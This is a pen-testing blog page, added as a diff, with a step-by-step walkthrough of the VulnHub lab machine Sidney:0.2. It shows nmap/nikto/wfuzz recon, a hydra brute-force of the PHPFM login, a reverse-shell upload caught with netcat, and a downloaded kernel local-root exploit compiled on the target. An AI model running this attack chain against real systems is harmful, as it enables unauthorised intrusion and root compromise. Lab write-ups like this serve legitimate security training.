@@ -1,0 +1,320 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>Sidney:0.2  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Wfuzz
+Nikto
+Burp Suite
+Hydra Vulnerabilities: PHPFM Arbitrary File Upload
+Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double- &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Sidney:0.2</h2>
+	<div class="entry-content"><h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Burp Suite</li>
+<li>Hydra</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/26474/">PHPFM Arbitrary File Upload</a></li>
+<li><a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/sidney2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.153 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.153 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.153</code></p>
+
+<p>No useful info come out.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.153/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>
+
+
+<p>still same thing.</p>
+
+<p>check the <a href="http://192.168.41.153,">http://192.168.41.153,</a> find a picture,</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the picture info:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a path:  <code>http://192.168.41.153/commodore64/</code></p>
+
+<p>now use nikto to scan that path,</p>
+
+<p><code>nikto -h http://192.168.41.153/commodore64/</code></p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting file <code>index.php</code>,</p>
+
+<p>check that file,</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the login page, and the CMS seems PHPFM</p>
+
+<p><code>searchsploit PHPFM</code></p>
+
+<p>find a PHPFM Arbitrary File Upload, now I need to find a way to upload the shell. First, I have to get the access to the PHPFM</p>
+
+<p>In <code>http://192.168.41.153/commodore64</code>, I found:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I will try <code>robhubbard</code> as username. Password a C64 sound chip lowercase 3letters4digits without spaces&hellip; After checking wikipedia and more sites, seems that MOS is one of the sound chips (3 letters) Time to make our dictionary with MOS + 4 numbers and minimum+maximum of 7 words.</p>
+
+<p><code>crunch 7 7 -t mos%%%% &gt; test.txt</code></p>
+
+<p>before using hydra to crack password, I use Burp to get incorrect login response,</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -l robhubbard -P test.txt 192.168.41.153 http-post-form "/commodore64/index.php:input_username=^USER^&input_password=^PASS^:Login" -V</span></code></pre></td></tr></table></div></figure>
+
+
+<p>get the password <code>mos6518</code></p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login, get the page:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set up netcat and go to <code>http://192.168.41.153/commodore64/reverse.php</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Since the Linux kernel version here is 4.4.0</p>
+
+<p><code>searchsploit 4.4 | grep linux</code></p>
+
+<p>exploit found <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>
+
+<p>In Kali:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+</span><span class='line'>cp 39772.zip /var/www/html/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In target:</p>
+
+<p>upload the 39772.zip via phpfm, in the shell</p>
+
+<p><code>find / -name 39772.zip</code></p>
+
+<p>shows the file in <code>/var/www/html/commodore64/</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd  /var/www/html/commodore64/
+</span><span class='line'>unzip 39772.zip
+</span><span class='line'>cd 39772
+</span><span class='line'>tar xvf exploit.tar
+</span><span class='line'>cd ebpf_mapfd_doubleput_exploit/
+</span><span class='line'>./compile.sh
+</span><span class='line'>./doubleput</span></code></pre></td></tr></table></div></figure>
+
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/sidney2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-07-27T10:23:04-05:00" pubdate data-updated="true">2016-07-27 10:23:04 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/phpfm/'>phpfm</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
